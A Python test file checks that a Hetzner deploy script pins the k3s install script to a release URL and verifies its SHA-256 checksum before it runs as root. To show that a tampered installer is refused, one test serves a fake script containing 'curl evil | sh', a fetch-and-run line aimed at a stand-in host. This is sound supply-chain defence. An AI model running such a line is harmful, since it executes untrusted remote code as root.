"""deploy/hetzner/cluster.sh's own logic, without servers: the k3s install script it runs as root on every node.

The whole setup runs for real in deploy/hetzner/ci/k3s-smoke.sh (CI job ``hetzner``)."""

from __future__ import annotations

import hashlib
import os
import subprocess

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _run(tmp_path, served: str, **env):
    """cluster.sh k3s-installer with a curl that serves ``served`` and records the URL it was asked for."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    (tmp_path / "served").write_text(served)
    curl = bin_dir / "curl"
    curl.write_text('#!/usr/bin/env bash\nout=""; url=""\n'
                    'while [ $# -gt 0 ]; do case "$1" in -o) out=$2; shift 2 ;; http*) url=$1; shift ;; *) shift ;; esac; done\n'
                    f'echo "$url" >>"{tmp_path}/urls"; cp "{tmp_path}/served" "$out"\n')
    curl.chmod(0o755)
    cenv = tmp_path / "cluster.env"
    cenv.write_text(f'CLUSTER_NAME=t\nNODES=("a 192.0.2.1 10.0.0.1")\nSTATE_DIR={tmp_path}/state\n')
    full = {**os.environ, "PATH": f"{bin_dir}:{os.environ['PATH']}", **env}
    for k in ("K3S_VERSION", "K3S_INSTALL_SHA256"):
        if k not in env:
            full.pop(k, None)
    return subprocess.run(["deploy/hetzner/cluster.sh", str(cenv), "k3s-installer"], cwd=ROOT, env=full,
                          capture_output=True, text=True, timeout=60)


def test_the_k3s_install_script_is_pinned_to_the_release_and_checked(tmp_path):
    """Before: every node ran whatever https://get.k3s.io served at that moment, as root (curl | sh)."""
    script = "#!/bin/sh\necho k3s installer\n"
    digest = hashlib.sha256(script.encode()).hexdigest()
    r = _run(tmp_path, script, K3S_VERSION="v1.33.3+k3s1", K3S_INSTALL_SHA256=digest)
    assert r.returncode == 0, r.stderr
    path = r.stdout.strip()
    assert open(path).read() == script
    assert oct(os.stat(path).st_mode & 0o777) == "0o600"
    assert (tmp_path / "urls").read_text().split() == [
        "https://raw.githubusercontent.com/k3s-io/k3s/v1.33.3%2Bk3s1/install.sh"]


def test_a_changed_install_script_is_refused(tmp_path):
    r = _run(tmp_path, "#!/bin/sh\ncurl evil | sh\n")   # the default version, with its pinned checksum
    assert r.returncode != 0 and "has sha256" in r.stderr
    assert not (tmp_path / "state" / "k3s-install-v1.33.3+k3s1.sh").exists()


def test_another_version_needs_its_checksum(tmp_path):
    r = _run(tmp_path, "#!/bin/sh\n", K3S_VERSION="v1.34.1+k3s1")
    assert r.returncode != 0 and "set K3S_INSTALL_SHA256" in r.stderr
    assert not (tmp_path / "urls").exists()
